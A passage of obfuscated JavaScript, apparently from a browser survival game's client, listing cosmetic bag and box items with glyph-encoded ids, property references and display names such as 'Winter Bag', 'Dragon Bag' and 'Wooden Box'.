				}, {
					id: 10,
					"ᐃΔⲆ": ⲆΔ.ΔⲆⲆᐃᐃΔᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆᐃΔⵠⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Winter Bag"
				}, {
					id: 20,
					"ᐃΔⲆ": ⲆΔ.ᐃΔⲆΔΔⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠΔⲆⵠΔᐃⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[22],
					name: "Stone Carrier"
				}, {
					id: 24,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠᐃᐃⵠᐃᐃ,
					"ΔΔᐃ": ⲆΔ.ⲆΔⲆᐃⲆΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Stone Pickaxe Bag"
				}, {
					id: ᐃⵠⵠⲆⵠ,
					"ᐃΔⲆ": ⲆΔ.ᐃᐃΔᐃΔⲆΔ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆᐃⵠᐃⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[ᐃΔΔⲆΔ],
					name: "Bag Camouflage"
				}, {
					id: 38,
					"ᐃΔⲆ": ⲆΔ.ΔΔᐃⲆΔⲆᐃ,
					"ΔΔᐃ": ⲆΔ.ΔΔⵠᐃⲆΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Bag with Stone Swords"
				}, {
					id: 54,
					"ᐃΔⲆ": ⲆΔ.ᐃᐃᐃΔⲆΔⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆᐃⲆⲆⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Cow Bag"
				}, {
					id: 59,
					"ᐃΔⲆ": ⲆΔ.ΔⲆⲆⵠᐃⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠΔᐃⵠΔΔⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[373],
					name: "Starver Bag"
				}, {
					id: 62,
					"ᐃΔⲆ": ⲆΔ.ⵠΔⲆⲆⵠⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ΔⲆᐃΔⲆΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[373],
					name: "Crystal Sky Bag"
				}, {
					id: 71,
					"ᐃΔⲆ": ⲆΔ.ΔⲆΔⵠⲆⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆⲆⵠⲆⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Portable Furnace"
				}, {
					id: 78,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠΔᐃⲆⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃⲆᐃⲆⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Crate Bag"
				}, {
					id: Δⵠᐃⵠⵠ,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠᐃΔⵠⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆⵠΔΔⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Honey Pot"
				}, {
					id: 21,
					"ᐃΔⲆ": ⲆΔ.ᐃᐃⲆΔⵠΔΔ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃⲆⵠⲆⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[22],
					name: "Gold Carrier"
				}, {
					id: 30,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠⵠΔⵠⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆᐃⵠⲆΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Gold Pickaxe Bag"
				}, {
					id: 29,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⲆΔⲆⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠΔⲆΔⲆᐃⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": "Ariel",
					name: "Mr and Mrs Bakers"
				}, {
					id: 41,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠⵠⲆⲆⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ΔⵠΔⲆΔⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Bag with Golden Swords"
				}, {
					id: 47,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠᐃΔΔⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠⲆΔᐃΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Explorer Bag"
				}, {
					id: 51,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃΔⲆⲆΔᐃ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆⲆⵠΔⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Bamboo Bag"
				}, {
					id: 53,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⲆᐃⵠⵠΔ,
					"ΔΔᐃ": ⲆΔ.ΔⲆᐃⵠΔΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Mummy Bag"
				}, {
					id: 58,
					"ᐃΔⲆ": ⲆΔ.ΔⵠΔⲆⲆΔᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆⵠΔⲆⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[21],
					name: "Watermelon Bag"
				}, {
					id: 60,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠᐃΔᐃᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆΔᐃⲆΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Garlic Bag"
				}, {
					id: 61,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠⵠⵠΔΔΔ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠΔⲆΔᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Pumpkin Bag"
				}, {
					id: 64,
					"ᐃΔⲆ": ⲆΔ.ΔⲆᐃⲆⲆⵠΔ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠⵠᐃᐃΔⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[263],
					name: "Oil Barel bag"
				}, {
					id: 67,
					"ᐃΔⲆ": ⲆΔ.ⲆᐃⵠᐃⵠΔᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃΔⲆᐃᐃᐃⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Tree Bag"
				}, {
					id: 70,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠⵠΔⲆᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃⲆΔᐃΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Lit Portable Furnace"
				}, {
					id: 72,
					"ᐃΔⲆ": ⲆΔ.ΔⵠᐃⵠΔΔⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆΔⵠᐃⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Christmas Berry Bush Bag"
				}, {
					id: 73,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠⲆⵠΔⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆⲆⲆΔⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Berry Bush Bag"
				}, {
					id: 74,
					"ᐃΔⲆ": ⲆΔ.ⲆᐃⵠⵠⵠⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ΔᐃΔΔΔⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Fall Berry Bush Bag"
				}, {
					id: 76,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⲆⲆᐃΔᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠΔⵠΔⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Reclaimed Bag"
				}, {
					id: ⵠⵠⵠᐃᐃ,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠΔᐃⵠΔⲆ,
					"ΔΔᐃ": ⲆΔ.ΔᐃⵠⲆΔᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "a Rabbit in my Bag"
				}, {
					id: ΔⵠⵠᐃΔᐃⲆ,
					"ᐃΔⲆ": ⲆΔ.ᐃᐃⲆⲆΔⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠⲆΔⲆᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Bird's nest"
				}, {
					id: ᐃⲆᐃᐃΔ,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠᐃⲆᐃⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ΔᐃⵠⲆᐃᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "a Fish on your Back"
				}, {
					id: 17,
					"ᐃΔⲆ": ⲆΔ.ⵠΔⵠᐃΔⲆΔ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃⵠΔΔΔⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "a Squirrel in my Bag"
				}, {
					id: 22,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠⵠⲆΔΔⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠⵠΔᐃᐃⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[22],
					name: "Diamond Carrier"
				}, {
					id: 12,
					"ᐃΔⲆ": ⲆΔ.ⵠΔΔᐃⲆⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ΔΔⲆΔΔΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Resources Bag"
				}, {
					id: 32,
					"ᐃΔⲆ": ⲆΔ.ⵠΔⲆⵠΔⵠΔ,
					"ΔΔᐃ": ⲆΔ.ⲆᐃΔΔⵠᐃⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Diamond Pickaxe Bag"
				}, {
					id: 40,
					"ᐃΔⲆ": ⲆΔ.ⲆᐃᐃΔⵠⲆΔ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆΔᐃᐃⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Bag with Diamond Swords"
				}, {
					id: 45,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠⵠⲆⵠⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠⲆⲆⲆΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[445],
					name: "My Cake Bag"
				}, {
					id: 46,
					"ᐃΔⲆ": ⲆΔ.ⲆᐃⵠⵠⵠᐃΔ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠΔΔⵠⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[445],
					name: "My Christmas Cake Bag"
				}, {
					id: 52,
					"ᐃΔⲆ": ⲆΔ.ⵠΔⲆⲆⲆΔΔ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠⲆΔⵠᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[21],
					name: "Fish Bag"
				}, {
					id: 65,
					"ᐃΔⲆ": ⲆΔ.ⲆᐃΔⲆⵠⵠΔ,
					"ΔΔᐃ": ⲆΔ.ᐃΔΔⲆΔᐃⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Cloud Bag"
				}, {
					id: 68,
					"ᐃΔⲆ": ⲆΔ.ΔΔⲆⵠᐃⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃᐃⵠⲆᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Bee Bag"
				}, {
					id: 77,
					"ᐃΔⲆ": ⲆΔ.ᐃᐃΔⲆⲆⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆⲆⲆⲆᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Bag and Bedroll"
				}, {
					id: 80,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠᐃᐃΔⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ΔⲆᐃᐃⵠⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Peasant's Bag"
				}, {
					id: 81,
					"ᐃΔⲆ": ⲆΔ.ΔⵠΔᐃΔΔΔ,
					"ΔΔᐃ": ⲆΔ.ⲆᐃᐃᐃΔⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Probably Stolen Bag"
				}, {
					id: 48,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠᐃⲆΔⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆΔΔᐃⲆᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": "fatant",
					name: "Natural Bag"
				}, {
					id: 23,
					"ᐃΔⲆ": ⲆΔ.ⲆΔᐃᐃΔΔⵠ,
					"ΔΔᐃ": ⲆΔ.ΔΔΔⵠⲆⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[22],
					name: "Amethyst Carrier"
				}, {
					id: 25,
					"ᐃΔⲆ": ⲆΔ.ᐃΔΔⲆᐃⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠᐃⵠᐃⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Amethyst Pickaxe Bag"
				}, {
					id: 28,
					"ᐃΔⲆ": ⲆΔ.ΔΔΔⵠⵠᐃΔ,
					"ΔΔᐃ": ⲆΔ.ᐃΔⵠⲆⵠⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Your Baby"
				}, {
					id: 33,
					"ᐃΔⲆ": ⲆΔ.ᐃΔΔⲆⲆᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆᐃⲆᐃΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Tropical Bag"
				}, {
					id: 43,
					"ᐃΔⲆ": ⲆΔ.ᐃᐃⵠᐃΔΔⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠⵠⵠⲆᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Bag with Amethyst Swords"
				}, {
					id: 35,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠᐃⲆⵠⲆᐃ,
					"ΔΔᐃ": ⲆΔ.ⲆᐃΔⲆΔⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Ice Bag"
				}, {
					id: 50,
					"ᐃΔⲆ": ⲆΔ.ΔⲆⲆⵠΔᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃΔⲆᐃⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Thornbush Bag"
				}, {
					id: 56,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⵠᐃΔⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠⵠⵠⲆⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Autumn Bag"
				}, {
					id: 57,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⲆⲆᐃⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ΔᐃΔΔᐃΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Dino Egg Bag"
				}, {
					id: 66,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃⵠⵠⵠⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃΔⵠΔⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Magic Cloud Bag"
				}, {
					id: 69,
					"ᐃΔⲆ": ⲆΔ.ᐃᐃⵠⲆᐃᐃᐃ,
					"ΔΔᐃ": ⲆΔ.Ⲇᐃᐃⵠⵠⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Chest Bag"
				}, {
					id: 75,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆᐃΔᐃⵠΔ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠᐃΔⲆΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Tamon Spectum Bag"
				}, {
					id: 79,
					"ᐃΔⲆ": ⲆΔ.ᐃᐃᐃΔΔⲆΔ,
					"ΔΔᐃ": ⲆΔ.ΔᐃⵠⲆⵠⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Winter Peasant's Bag"
				}, {
					id: 31,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆⵠΔⲆⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠⵠⲆⵠᐃⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[22],
					name: "Reidite Carrier"
				}, {
					id: ⲆⲆΔⲆⵠᐃᐃ,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆⵠᐃⵠΔⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆⵠⵠΔⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[36],
					name: "Lava Bag"
				}, {
					id: 49,
					"ᐃΔⲆ": ⲆΔ.ᐃᐃᐃⵠⲆᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ΔⵠⲆⲆᐃⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Lava Bag 2"
				}, {
					id: 36,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⵠᐃⵠΔⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠⵠⲆᐃⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Dragon Bag"
				}, {
					id: 55,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆΔⵠΔΔΔ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆⵠⲆᐃⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Winter Ice Bag"
				}, {
					id: 26,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆΔⵠᐃᐃΔ,
					"ΔΔᐃ": ⲆΔ.ΔⲆᐃᐃⵠⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Reidite Pickaxe Bag"
				}, {
					id: 27,
					"ᐃΔⲆ": ⲆΔ.ⵠΔⲆΔⲆΔⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠΔⵠΔᐃⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Octopus Bowl"
				}, {
					id: 34,
					"ᐃΔⲆ": ⲆΔ.ΔᐃᐃΔᐃⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠⵠΔⵠᐃⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Cave Bag"
				}, {
					id: 42,
					"ᐃΔⲆ": ⲆΔ.ⵠΔΔⲆⵠᐃᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃᐃΔⵠⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Bag with Reidite Swords"
				}, {
					id: 63,
					"ᐃΔⲆ": ⲆΔ.ⲆᐃᐃᐃⵠᐃΔ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃⲆⵠΔᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Engineer Bag"
				}],
				"ⲆᐃⲆΔᐃ": [{
					id: ΔΔⵠⵠ,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆᐃⵠΔᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠΔⵠⵠⵠⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠᐃⵠΔΔ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Wooden Dead Box"
				}, {
					id: 1,
					"ᐃΔⲆ": ⲆΔ.ΔᐃᐃⲆΔᐃᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆⵠᐃⲆⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠᐃⵠΔΔ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Hidden item"
				}, {
					id: Δᐃⵠⵠ,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠⵠⵠᐃΔⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃΔⲆⵠΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Wooden Box 1"
				}, {
					id: 3,
					"ᐃΔⲆ": ⲆΔ.ⵠΔⵠⲆΔⲆΔ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃⵠΔⲆᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Wooden Box 2"
				}, {
					id: ⲆⵠᐃΔ,
					"ᐃΔⲆ": ⲆΔ.ΔⵠⲆᐃⵠΔⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠⲆΔᐃⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Wooden Box 3"
				}, {
					id: ᐃΔΔⲆ,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃᐃⲆᐃᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆᐃⲆⵠⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Broken Wooden Box"
				}, {
					id: ⵠᐃΔⵠⲆ,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⵠⵠⵠΔⵠ,
					"ΔΔᐃ": ⲆΔ.ΔⵠⲆΔⵠᐃⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Wooden Box"
				}, {
					id: 7,
					"ᐃΔⲆ": ⲆΔ.ΔⲆΔⲆΔᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠΔⵠΔⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Wooden Battle Box"
				}, {
					id: 8,
					"ᐃΔⲆ": ⲆΔ.ᐃΔⲆⲆΔΔΔ,
					"ΔΔᐃ": ⲆΔ.ΔᐃᐃᐃΔⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Wooden Box with a Cross"
				}, {
					id: 9,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠΔᐃᐃΔⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠᐃⲆⵠⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Wooden Box with Bubbles"
				}, {
					id: 10,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃᐃⵠΔΔΔ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆⲆΔᐃⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Wooden Box with Eyes"
				}, {
					id: 11,
					"ᐃΔⲆ": ⲆΔ.ΔᐃᐃᐃᐃΔΔ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃⲆΔⵠΔⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Dark Wooden Box"
				}, {
					id: 38,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃⲆⲆΔΔⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠⲆⲆᐃⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": "Weddlz",
					name: "Noob Box"
				}, {
					id: 12,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆᐃᐃⵠⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆᐃΔᐃΔⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Wooden and Stone Box"
				}, {
					id: ⵠᐃⵠΔᐃ,
					"ᐃΔⲆ": ⲆΔ.ⲆᐃⵠⵠΔⲆΔ,
					"ΔΔᐃ": ⲆΔ.ⵠΔⵠᐃⲆⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Star Box 1"
				}, {
					id: ⲆᐃⲆΔⲆ,
					"ᐃΔⲆ": ⲆΔ.ΔΔΔᐃΔⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃΔⲆᐃΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Star Box 2"
				}, {
